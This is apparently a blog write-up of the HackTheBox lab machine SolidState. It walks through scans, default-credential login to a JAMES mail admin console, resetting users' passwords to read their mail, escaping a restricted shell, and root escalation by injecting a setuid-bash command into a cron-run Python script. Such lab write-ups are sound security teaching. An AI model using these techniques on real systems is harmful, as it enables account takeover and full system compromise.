---
title: "HackTheBox - SolidState"
author: Nasrallah
description: ""
date: 2023-05-09 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, medium, cronjob, pop3]
img_path: /assets/img/hackthebox/machines/solidstate
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [SolidState](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.51                                               
Host is up (0.13s latency).                                                    
                                                                               
PORT     STATE SERVICE VERSION                                                 
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)           
| ssh-hostkey:                                                                 
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)                                
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)                               
|_  256 e445e9ed074d7369435a12709dc4af76 (ED25519)                             
25/tcp   open  smtp    JAMES smtpd 2.3.2                                       
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.17.90 [10.10.17.90])  
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))                          
|_http-server-header: Apache/2.4.25 (Debian)                       
|_http-title: Home - Solid State Security                                                                                                                     
110/tcp  open  pop3    JAMES pop3d 2.3.2                                       
119/tcp  open  nntp    JAMES nntpd (posting ok)                                
4555/tcp open  rsip?                                                           
| fingerprint-strings:                                                                                                                                        
|   GenericLines:                                                                                                                                             
|     JAMES Remote Administration Tool 2.3.2               
|     Please enter your login and password
|     Login id:                                                                
|     Password:                                                                
|     Login failed for                                                                                                                                        
|_    Login id:                                      
```

We found 6 open ports.

### Web

Let's navigate to the web page.

![](1.png)

Nothing look interesting and only static pages.

#### Feroxbuster

Let's run a directory scan

```terminal
$ feroxbuster -w /usr/share/wordlists/dirb/big.txt -o scans/fero.txt -u http://10.10.10.51/ -n -x txt,php                                       [359/452]
                                                                                                                                                              
 ___  ___  __   __     __      __         __   ___                                                                                                            
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                             
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                            
by Ben "epi" Risher 🤓                 ver: 2.7.2                                                                                                             
───────────────────────────┬──────────────────────                                                                                                            
 🎯  Target Url            │ http://10.10.10.51/                                                                                                              
 🚀  Threads               │ 50                                                                                                                               
 📖  Wordlist              │ /usr/share/wordlists/dirb/big.txt                                                                                                
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                                
 🦡  User-Agent            │ feroxbuster/2.7.2                                                                                                                
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                               
 💾  Output File           │ scans/fero.txt                                                                                                                   
 💲  Extensions            │ [txt, php]                                                                                                                       
 🏁  HTTP methods          │ [GET]                                                                                                                            
 🚫  Do Not Recurse        │ true                                                                                                                             
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                            
───────────────────────────┴──────────────────────                                                                                                            
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                           
──────────────────────────────────────────────────                                                                                                            
200      GET      179l      680w     7776c http://10.10.10.51/                                                                                                
403      GET       11l       32w      295c http://10.10.10.51/.htpasswd                                                                                       
403      GET       11l       32w      295c http://10.10.10.51/.htaccess                                                                                       
403      GET       11l       32w      299c http://10.10.10.51/.htpasswd.txt                                                                                   
403      GET       11l       32w      299c http://10.10.10.51/.htaccess.txt                                                                                   
403      GET       11l       32w      299c http://10.10.10.51/.htpasswd.php                                                                                   
403      GET       11l       32w      299c http://10.10.10.51/.htaccess.php                                                                                   
200      GET       63l     2733w    17128c http://10.10.10.51/LICENSE.txt                                                                                     
200      GET       34l      133w      963c http://10.10.10.51/README.txt                                                                                      
301      GET        9l       28w      311c http://10.10.10.51/assets => http://10.10.10.51/assets/                                                            
301      GET        9l       28w      311c http://10.10.10.51/images => http://10.10.10.51/images/                                                            
403      GET       11l       32w      299c http://10.10.10.51/server-status                                                                                   
[####################] - 3m     61407/61407   0s      found:12      errors:4                                                                                  
[####################] - 3m     61407/61407   277/s   http://10.10.10.51/               
```

Still nothing useful to be found

### James Remote Administration Tool

There is an administration tool version 2.3.2 running on port 4555, after we google this tool we find it's vulnerable to a remote code execution.

I tried multiple exploits and they all seem to work fine, the only thing we need to get a shell is someone to login via ssh, i waited for someone to login but nothing happened.

Let's connect to the tool ourselves and see what we can do.

```terminal
$ nc -nv 10.10.10.51 4555                                                                                                                            1 ⨯
(UNKNOWN) [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
```

We get prompt for a login id, i looked back at the exploits and saw it was using root:root so let's try that

```terminal
$ nc -nv 10.10.10.51 4555                                                                                                                            1 ⨯
(UNKNOWN) [10.10.10.51] 4555 (?) open
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts 
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding 
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

After logging in successfully I run `HELP` and saw the command we can run.

The command `listusers` sounds interesting, let's see what it does.

```terminal
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Found total of 5 users.

One other command that seems useful is `setpassword` which allows us to set users's passwords.

I changed `james` password i tried to login via ssh but didn't work, then i tried with POP3 and logged in.

![](2.png)

James had no emails unfortunately.

Let's try the same thing with other users

![](3.png)

We logged in as user john after setting his password and we managed to find an email and we know that john sent mindy a password for her account.

Let's set `mindy`'s password and see if she got an email with a password.

![](4.png)

We found two emails and the second one had a password.


## **Foothold**

Let's ssh to mindy's account.

![](5.png)

We logged in successfully but we can't run commands as normal, that's because of `rbash` which is a restricted shell.

Searching for `rbash` on google gives a result on how to escape it.

To get a normal bash shell, we add `-t "bash"` to our ssh command

![](6.png)

## **Privilege Escalation**

Randomly checking directories on the target system I came across a python script called `tmp.py` in the `/opt` directories

```terminal
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py                                                                                           
#!/usr/bin/env python                                                                                                                                         
import os                                                                                                                                                     
import sys                                                                                                                                                    
try:                                                                                                                                                          
     os.system('rm -r /tmp/* ')                                                                                                                               
except:                                                                                                                                                       
     sys.exit()                                      
```

The script cleans the /tmp directory, so i guessed there must be a cronjob running it.

I added the following line to the file and waited.

```python
os.system("cp /bin/bash /tmp/bash && chmod +s /bin/bash")
```

After waiting for a bit nothing happened so i decided to run `linpeas` and `pspy64` and right before i run them the cronjob ran and wiped the /tmp directory where i put the two files and I found the `bash` binary with suid bit.

![](7.png)

Running `/tmp/bash -p` gives root shell.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).